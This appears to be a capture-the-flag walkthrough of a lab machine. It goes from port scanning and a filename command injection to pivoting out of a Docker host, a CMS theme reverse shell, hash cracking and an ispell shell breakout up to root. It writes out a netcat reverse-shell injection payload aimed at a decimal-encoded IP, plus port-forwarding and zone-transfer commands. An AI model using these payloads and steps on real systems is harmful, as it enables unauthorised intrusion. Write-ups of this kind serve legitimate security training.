Started with a nmap scan
```
22 OpenSSH 6.7p1
80 nginx 1.6.2
111 rpcbind
50925
```
Starting a gobuster scan
```
/static
/static/js/
/static/img/
/static/css/
/mail/contact_me.php
```
Looking at the webhost there is a `/upload` section were we can only upload `txt,rtf` files all we have is a file upload function we can we do command injection on the file name but the file name can only be 30 letters max so we need to convert are ip to decimal format `test.txt;nc 168626431 4444 -e sh` and now we have a shell as `www-data` looking in the `main.py` file we have a ftp login `someuser:..................` we have to write a python script to connect to the FTP service with the domain and creds we have and there is a file called `creds.txt` `admin:.................` but we need to find were these creds go scanning the docker some more found another interface on ip `192.168.150.0/24` but there is no nmap on the host so we need to use proxy chains to scan the host and found a ip on `192.168.150.1` so now we need to port forwarding on this host to get a better host I made a elf payload with msfvenom and then ran it will also make port forwarding easier using this command `portfwd add -l 8888 -p 80 -r 192.168.150.1` and now we have the website doing  a dig command we found some subdomains `dig axfr mofo.pwn` and there is a couple but we want the `newcms` one now running a gobuster on the site
```
/blog
/admin
/contact
```
now we can login into the admin section with the creds we found and we can edit the pages of the site but if we edit the theme with a php reverse shell and now we are `www-data` outside of the docker running linpeas on the host and found a database in the host in the `/var/www/inc/data/database.sdb` and it has 2 hashes we can try cracking after a little bit we cracked one password and it works on the SSH account of `benclower:.....................` when we did are enumeration eailer we found we can run a program called `ispell` and this program if you check the manage file for this there is a shell breakout after we do the shell breakout we can now read the `auth.log` file that has the root password in it `...................` and now we can get the root flag 